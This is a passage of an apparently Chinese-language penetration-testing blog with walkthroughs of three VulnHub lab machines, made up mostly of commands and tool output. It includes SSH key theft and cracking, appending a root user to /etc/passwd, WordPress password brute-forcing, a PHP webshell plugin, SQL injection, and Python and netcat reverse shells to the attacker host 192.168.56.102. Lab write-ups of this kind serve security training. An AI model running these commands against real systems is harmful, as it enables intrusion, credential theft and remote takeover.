class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_rsa_key:</span><br><span class="line">###################################</span><br><span class="line">&gt;&gt;&gt;/home/mowree/.ssh/ssh_host_rsa_key.pub:</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch id_rsa &amp;&amp; curl &quot;http://192.168.56.105/secret/evil.php?command=/home/mowree/.ssh/id_rsa&quot; -m 1 -s &gt; id_rsa &amp;&amp; chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mowree@192.168.56.105 -i id_rsa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py ./id_rsa &gt; ./hash_id_rsa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john hash_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230713210843206.png" alt="image-20230713210843206"></p>
<h3 id="提权法一："><a href="#提权法一：" class="headerlink" title="提权法一："></a>提权法一：</h3><p>查看我们具有写权限的隐秘文件是否存在</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -writable 2&gt;/dev/null | grep &#x27;etc&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/]</span><br><span class="line">└─# openssl passwd -1</span><br><span class="line">Password: </span><br><span class="line">Verifying - Password: </span><br><span class="line">$1$MIFi7ZAo$H1NkTSlUggj5ZbYSw5H9x.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;root:$1$MIFi7ZAo$H1NkTSlUggj5ZbYSw5H9x.:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/]</span><br><span class="line">└─# openssl passwd -1 -salt jere</span><br><span class="line">Password: </span><br><span class="line">$1$jere$pGQGlxgnH.no4.Pphez9o1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;jere:$1$jere$pGQGlxgnH.no4.Pphez9o1:0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su jere</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@EvilBoxOne:/home/mowree# id</span><br><span class="line">uid=0(root) gid=0(root) grupos=0(root)</span><br><span class="line">root@EvilBoxOne:/home/mowree# ls</span><br><span class="line">user.txt</span><br><span class="line">root@EvilBoxOne:/home/mowree# cd /</span><br><span class="line">root@EvilBoxOne:/# ls</span><br><span class="line">bin   etc         initrd.img.old  lib64       media  proc  sbin  tmp  vmlinuz</span><br><span class="line">boot  home        lib             libx32      mnt    root  srv   usr  vmlinuz.old</span><br><span class="line">dev   initrd.img  lib32           lost+found  opt    run   sys   var</span><br><span class="line">root@EvilBoxOne:/# cd root</span><br><span class="line">root@EvilBoxOne:~# ls</span><br><span class="line">root.txt</span><br><span class="line">root@EvilBoxOne:~# cat root.txt</span><br><span class="line">36QtXfdJWvdC0VavlPIApUbDlqTsBM</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230713212243930.png" alt="image-20230713212243930"></p>
<h1 id="靶机-AdmX-new"><a href="#靶机-AdmX-new" class="headerlink" title="靶机: AdmX_new"></a>靶机: AdmX_new</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16852264.html" >https://www.cnblogs.com/shadow-/p/16852264.html<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -sV 192.168.56.200</span><br><span class="line">dirsearch -u &quot;http://192.168.56.200&quot; -x 403</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">10</span>:<span class="number">10</span>:08] Starting: </span><br><span class="line">[<span class="number">10</span>:<span class="number">10</span>:<span class="number">34</span>] <span class="number">200</span> -   11KB - /index.html                                       </span><br><span class="line">[<span class="number">10</span>:<span class="number">10</span>:<span class="number">52</span>] <span class="number">301</span> -  316B  - /tools  -&gt;  http://<span class="number">192.168</span><span class="number">.56</span><span class="number">.200</span>/tools/          </span><br><span class="line">[<span class="number">10</span>:<span class="number">10</span>:<span class="number">57</span>] <span class="number">200</span> -    7KB - /wordpress/wp-login.php                           </span><br><span class="line">[<span class="number">10</span>:<span class="number">10</span>:<span class="number">57</span>] <span class="number">200</span> -    8KB - /wordpress/</span><br><span class="line"></span><br><span class="line">Task Completed         </span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230714132721424.png" alt="image-20230714132721424"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.200/wordpress --enumerate</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ wpscan --url http://192.168.56.200/wordpress --enumerate</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.56.200/wordpress/ [192.168.56.200]</span><br><span class="line">[+] Started: Fri Jul 14 01:34:56 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Proxy-Connection: keep-alive</span><br><span class="line"> |  - Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.56.200/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.56.200/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.56.200/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.56.200/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.7.1 identified (Insecure, released on 2021-04-15).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.56.200/wordpress/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.1&#x27;</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.56.200/wordpress/, Match: &#x27;WordPress 5.7.1&#x27;</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:02 &lt;=============&gt; (504 / 504) 100.00% Time: 00:00:02</span><br><span class="line"></span><br><span class="line">[i] No themes Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:00:13 &lt;===========&gt; (2568 / 2568) 100.00% Time: 00:00:13</span><br><span class="line"></span><br><span class="line">[i] No Timthumbs Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;==============&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span><br><span class="line"> Checking DB Exports - Time: 00:00:00 &lt;====================&gt; (71 / 71) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No DB Exports Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span><br><span class="line"> Brute Forcing Attachment IDs - Time: 00:00:00 &lt;=========&gt; (100 / 100) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Medias Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:00 &lt;===============&gt; (10 / 10) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] admin</span><br><span class="line"> | Found By: Wp Json Api (Aggressive Detection)</span><br><span class="line"> |  - http://192.168.56.200/wordpress/wp-json/wp/v2/users/?per_page=100&amp;page=1</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri Jul 14 01:35:27 2023</span><br><span class="line">[+] Requests Done: 3442</span><br><span class="line">[+] Cached Requests: 4</span><br><span class="line">[+] Data Sent: 1.172 MB</span><br><span class="line">[+] Data Received: 21.453 MB</span><br><span class="line">[+] Memory used: 280.055 MB</span><br><span class="line">[+] Elapsed time: 00:00:31</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.56.200/wordpress -U admin -P /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[/usr/share/seclists]</span><br><span class="line">└─$ wpscan --url http://192.168.56.200/wordpress -U admin -P /usr/share/wordlists/rockyou.txt </span><br><span class="line"></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.56.200/wordpress/ [192.168.56.200]</span><br><span class="line">[+] Started: Fri Jul 14 01:40:56 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - Proxy-Connection: keep-alive</span><br><span class="line"> |  - Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://192.168.56.200/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://192.168.56.200/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://192.168.56.200/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://192.168.56.200/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.7.1 identified (Insecure, released on 2021-04-15).</span><br><span class="line"> | Found By: Emoji Settings (Passive Detection)</span><br><span class="line"> |  - http://192.168.56.200/wordpress/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=5.7.1&#x27;</span><br><span class="line"> | Confirmed By: Meta Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.56.200/wordpress/, Match: &#x27;WordPress 5.7.1&#x27;</span><br><span class="line"></span><br><span class="line">[i] The main theme could not be detected.</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:00 &lt;==============&gt; (137 / 137) 100.00% Time: 00:00:00</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Xmlrpc against 1 user/s</span><br><span class="line">[SUCCESS] - admin / adam14                                                                   </span><br><span class="line">Trying admin / adalberto Time: 00:03:44 &lt;          &gt; (29510 / 14373902)  0.20%  ETA: ??:??:??</span><br><span class="line"></span><br><span class="line">[!] Valid Combinations Found:</span><br><span class="line"> | Username: admin, Password: adam14</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Fri Jul 14 01:44:44 2023</span><br><span class="line">[+] Requests Done: 29651</span><br><span class="line">[+] Cached Requests: 29</span><br><span class="line">[+] Data Sent: 17.158 MB</span><br><span class="line">[+] Data Received: 17.937 MB</span><br><span class="line">[+] Memory used: 272.906 MB</span><br><span class="line">[+] Elapsed time: 00:03:48</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.200/wordpress/wp-login.php</span><br><span class="line">admin adam14</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Plugin Name:Webshell</span><br><span class="line"> * Description:WP Webshell for Pentest</span><br><span class="line"> * Version:1.0</span><br><span class="line"> */</span><br><span class="line">if(isset($_GET[&#x27;cmd&#x27;]))</span><br><span class="line">    &#123;</span><br><span class="line">            system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230714140038135.png" alt="image-20230714140038135"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.200/wordpress/wp-content/plugins/shell.php?cmd=id</span><br></pre></td></tr></table></figure>

<p>python反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.102&quot;,7779));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn([&quot;/bin/bash&quot;])&#x27;</span><br></pre></td></tr></table></figure>

<p>第一个flag</p>
<p><img src="/../images/30-pennnnnnnnnnntest/image-20230714140459044.png" alt="image-20230714140459044"></p>
<p>第二个flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/mysql -u root -D wordpress -p</span><br><span class="line">adam14</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\! /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/../images/30-pennnnnnnnnnntest/image-20230714141042976.png" alt="image-20230714141042976"></p>
<h1 id="靶机-easy-cloudantivirus"><a href="#靶机-easy-cloudantivirus" class="headerlink" title="靶机: easy_cloudantivirus"></a>靶机: easy_cloudantivirus</h1><p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/shadow-/p/16819678.html" >https://www.cnblogs.com/shadow-/p/16819678.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/jason-huawen/p/16867502.html" >https://www.cnblogs.com/jason-huawen/p/16867502.html<i class="fas fa-external-link-alt"></i></a> &#x2F;&#x2F;反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l -I eth0</span><br><span class="line">nmap -A -T4 192.168.56.106</span><br><span class="line">http://192.168.56.106:8080/</span><br></pre></td></tr></table></figure>

<p>target.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 192.168.56.106:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line">Origin: http://192.168.56.106:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.106:8080/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">password=123</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r target.txt -f --level 4 --risk 3</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; or 1=1 -- -</span><br></pre></td></tr></table></figure>



<p>反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.102 7779 &gt;/tmp/f</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh</span><br></pre></td></tr></table></figure>

<p>用户目录下存在特殊权限文件update_cloudav</p>
